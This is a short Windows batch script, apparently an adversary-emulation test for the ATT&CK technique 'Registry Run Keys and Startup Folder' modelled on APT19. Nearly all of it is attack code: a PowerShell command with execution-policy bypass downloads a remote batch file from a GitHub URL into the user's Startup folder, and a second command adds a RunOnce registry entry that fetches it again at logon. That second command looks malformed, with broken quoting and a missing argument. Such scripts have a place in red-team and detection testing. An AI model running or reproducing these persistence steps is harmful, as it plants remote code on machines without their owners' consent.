@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Registry Run Keys and Startup Folder (T1060)
ECHO.
ECHO [+] Add Registry Entries to achieve Persistence
ECHO 	- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
ECHO -------------------------------------------------------------------
powershell -ep bypass "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $URL='https://raw.githubusercontent.com/greycel/poc/master/collect.bat';$FileName='APT19_Startup.bat';$webclient=New-Object System.Net.WebClient;$file='$Env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$FileName';$webclient.DownloadFile($URL,'$file')"; 





 $RunOnceKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; New-ItemProperty -path $RunOnceKey -Name "NextRun" -PropertyType String -value 'powershell.exe (New-Object Net.WebClient).Downloadfile('https://github.com/greycel/poc/blob/master/collect.bat')';
ECHO.

